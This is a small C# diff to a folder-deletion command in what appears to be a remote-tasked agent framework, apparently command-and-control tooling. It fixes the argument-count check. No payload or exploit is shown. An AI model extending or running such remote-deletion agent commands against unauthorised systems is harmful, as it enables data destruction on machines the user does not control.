@@ -14,7 +14,7 @@ namespace Agent.Commands
         public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
         {
             string path;
-            if (task.SplittedArgs.Length != 0)
+            if (task.SplittedArgs.Length != 1)
             {
                 result.Result = $"Usage : {this.Name} folder_to_delete";
                 return;
